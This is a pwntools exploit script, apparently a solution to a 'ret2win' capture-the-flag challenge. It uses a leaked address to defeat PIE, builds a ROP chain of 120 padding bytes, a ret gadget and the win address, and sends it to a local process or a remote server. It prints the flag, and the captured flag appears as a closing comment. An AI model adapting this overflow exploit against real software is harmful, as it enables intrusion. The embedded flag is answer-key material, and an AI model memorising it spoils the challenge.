from pwn import *
elf = context.binary =  ELF('./ret2win')

if args.REMOTE:
	p = remote('103.185.44.122', 19003)
else:
	p = elf.process()

leak_addr = int(p.recvline().decode().split(": ")[1],16)
log.info('leak : ' + hex(leak_addr))

base_addr = leak_addr - elf.symbols['what_is_this_for']
log.info('base_addr : ' + hex(base_addr))

win_addr = base_addr + elf.symbols['win']

rop = ROP(elf)
rop.raw(b'A'*120)
rop.raw(p64(base_addr+rop.find_gadget(['ret'])[0]))
rop.raw(p64(win_addr))

p.sendline(rop.chain())
p.recvline()
print('Flag >> ', p.recvline().decode('utf-8'))
p.interactive()
# TCP1P{leak_satu_alamat_semua_alamat_ketahuan}
